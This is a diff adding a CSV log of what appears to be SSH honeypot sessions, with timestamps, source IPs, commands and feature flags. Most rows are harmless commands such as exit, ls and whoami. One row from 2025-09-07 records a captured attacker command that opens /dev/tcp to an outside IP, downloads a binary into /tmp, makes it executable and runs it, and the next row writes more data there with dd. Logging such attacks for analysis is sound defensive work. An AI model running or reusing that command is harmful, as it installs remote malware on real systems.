@@ -1,0 +1,29 @@
+timestamp,session_id,ip,event_type,command,command_length,has_command,has_url,has_ip_address,has_file_path,has_shell_metacharacters
+2025-07-27T07:17:33.299048,b31c9c8d-96cd-4429-afe0-36cafbe2d29b,79.142.197.170,exec_command,exit,4,True,False,False,False,False
+2025-07-27T07:24:31.307723,2855ddd5-74ca-4c76-a889-69a858802f5b,79.142.197.170,exec_command,exit,4,True,False,False,False,False
+2025-07-27T07:24:44.526569,efe50459-19f9-4998-bf56-ca4e9e9be258,79.142.197.170,exec_command,exit,4,True,False,False,False,False
+2025-07-27T07:49:49.443443,da00b02a-5566-4604-9aed-e74dc08605eb,104.28.220.247,exec_command,учше,4,True,False,False,False,False
+2025-07-27T07:49:53.671944,da00b02a-5566-4604-9aed-e74dc08605eb,104.28.220.247,exec_command,exit,4,True,False,False,False,False
+2025-07-30T11:22:51.299514,ac19ef5e-2a11-469c-a541-179dca92454c,104.28.220.248,exec_command,exit,4,True,False,False,False,False
+2025-07-30T11:41:56.336481,b78b92fc-f351-49d8-9325-7f4f5bdddb40,104.28.252.248,exec_command,cd /tmp,7,True,False,False,True,False
+2025-07-30T11:42:11.227590,b78b92fc-f351-49d8-9325-7f4f5bdddb40,104.28.252.248,exec_command,cd ..,5,True,False,False,False,False
+2025-07-30T11:42:14.615983,b78b92fc-f351-49d8-9325-7f4f5bdddb40,104.28.252.248,exec_command,cd /var,7,True,False,False,True,False
+2025-07-30T11:42:15.646820,b78b92fc-f351-49d8-9325-7f4f5bdddb40,104.28.252.248,exec_command,ls,2,True,False,False,False,False
+2025-07-30T11:42:23.095251,b78b92fc-f351-49d8-9325-7f4f5bdddb40,104.28.252.248,exec_command,exit,4,True,False,False,False,False
+2025-07-30T11:42:48.664060,2903b1a3-6ce7-42fd-8cf5-21c42a1cc3d3,104.28.220.248,exec_command,exit,4,True,False,False,False,False
+2025-07-30T11:43:15.917522,49a31cf7-0da1-48b6-842c-14f2b67aaf4d,104.28.252.248,exec_command,exit,4,True,False,False,False,False
+2025-07-31T15:59:23.902633,9c00ae0f-5a2f-47bf-9c53-784258b0bfe8,104.28.252.248,exec_command,exit,4,True,False,False,False,False
+2025-08-01T08:41:42.958816,ba7ece49-b9d1-4f40-b9f7-1a65711e694b,104.28.220.248,exec_command,exit,4,True,False,False,False,False
+2025-08-02T10:23:40.865785,781f8cc3-5152-4e55-8f98-db2b52e5193b,104.28.252.248,exec_command,exit,6,True,False,False,False,False
+2025-09-06T22:09:35.615336,a4daf0a1-5618-47a1-ac2f-fc6dc77ffe13,104.28.252.247,exec_command,ls,2,True,False,False,False,False
+2025-09-06T22:09:54.016458,a4daf0a1-5618-47a1-ac2f-fc6dc77ffe13,104.28.252.247,exec_command,exit,4,True,False,False,False,False
+2025-09-06T22:11:29.902522,132fbefe-8e75-48c0-b36a-aec50020e7ff,23.160.56.28,exec_command,whoami,6,True,False,False,False,False
+2025-09-06T22:12:04.160442,8a1ecf15-a063-4ce8-8480-d85e7f1b47a5,104.28.252.247,exec_command,ls,2,True,False,False,False,False
+2025-09-06T22:12:09.677266,8a1ecf15-a063-4ce8-8480-d85e7f1b47a5,104.28.252.247,exec_command,whoami,6,True,False,False,False,False
+2025-09-06T22:13:46.153415,8a1ecf15-a063-4ce8-8480-d85e7f1b47a5,104.28.252.247,exec_command,ды,2,True,False,False,False,False
+2025-09-06T22:13:48.396983,8a1ecf15-a063-4ce8-8480-d85e7f1b47a5,104.28.252.247,exec_command,ls,2,True,False,False,False,False
+2025-09-06T22:13:50.494141,8a1ecf15-a063-4ce8-8480-d85e7f1b47a5,104.28.252.247,exec_command,exit,4,True,False,False,False,False
+2025-09-07T08:39:07.020032,9caa7e8b-7378-41b7-9bdd-4ae800e2466e,47.251.118.172,exec_command,"nohup bash -c ""exec 6<>/dev/tcp/8.210.252.89/60147 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/6PLL1HZs1W && chmod +x /tmp/6PLL1HZs1W && /tmp/6PLL1HZs1W eclqfBbrMvESYGrVeXvRaH8V8iD0HHt21nN0yWp9Fesx9BB0btdwc9d4ehPrN/MKd2/Jc3XRYngU9DLzBHZ21XBxyWp7Fus4/B54aNZ1dsdseQr3M/0KfHbVdXTdbn4V8TPlEHl233dv1GxgFvYz/xJ+adNwYdZodgr0NvAKfGrfb3jVYngU9DLzBHpvyXNy3nZ8F/Au9BV2YtFxcNVrbhzrMvQTYGnVeW/VaXge8zD0EHt403Zv1Wt3CvMz6xV9ad13cdZqfwT0MPYKf2jWb3DSa2AW8jrzFH9o12F10HZ8EfQu9BV2dtZ2c91ufhX1NTqBmYhnHaDYQ8bBZnsN"" &",499,True,False,True,True,True
+2025-09-07T08:39:07.123850,9caa7e8b-7378-41b7-9bdd-4ae800e2466e,47.251.118.172,exec_command,dd bs=1 count=1911588 > /tmp/djJJJF5kbk,39,True,False,False,True,True
+2025-09-12T11:18:54.385113,99e75ce3-8857-4bd5-8008-addfcbbd2901,104.28.220.247,exec_command,HELLO,5,True,False,False,False,False
+2025-09-12T11:18:59.018567,99e75ce3-8857-4bd5-8008-addfcbbd2901,104.28.220.247,exec_command,exit,4,True,False,False,False,False
